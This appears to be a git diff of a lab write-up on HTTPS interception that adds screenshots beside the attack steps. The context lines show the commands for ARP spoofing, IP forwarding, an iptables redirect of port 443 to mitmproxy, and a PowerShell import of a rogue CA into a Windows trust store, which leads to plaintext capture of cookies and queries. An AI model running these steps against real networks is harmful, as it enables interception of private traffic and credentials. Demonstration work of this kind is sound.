@@ -64,6 +64,8 @@ def spoof(target, source):
     send(packet, verbose=False)
 ```
 
+![ARP spoofing running](images/arpspoofing.png)
+
 **2. Pass traffic through — IP forwarding + redirect HTTPS to mitmproxy**
 
 ```bash
@@ -74,11 +76,15 @@ sudo sysctl -w net.ipv4.ip_forward=1
 sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
 ```
 
+![IP forwarding and iptables redirect](images/configIPforwarding.png)
+
 **3. Terminate TLS — mitmproxy in transparent mode**
 
 ```bash
 mitmproxy -p 8080 --mode transparent
 ```
+
+![Starting mitmproxy in transparent mode](images/startmitmproxy.png)
 
 At this point the victim still sees certificate errors, because mitmproxy's CA
 is not trusted yet. Without step 4, TLS is doing its job.
@@ -102,8 +108,12 @@ Invoke-WebRequest -Uri $CertUrl -OutFile $LocalCertPath
 Import-Certificate -FilePath $LocalCertPath -CertStoreLocation "Cert:\LocalMachine\Root"
 ```
 
+![Rogue CA imported into the Windows trust store](images/InstalltheCustomRootCA.png)
+
 **Result:** a Google search typed on the victim appears in full plaintext in
 mitmproxy — query, headers, cookies — with no certificate warning.
+
+![Decrypted HTTPS traffic — plaintext Google query captured](images/httpsrevealed.png)
 
 ---
 
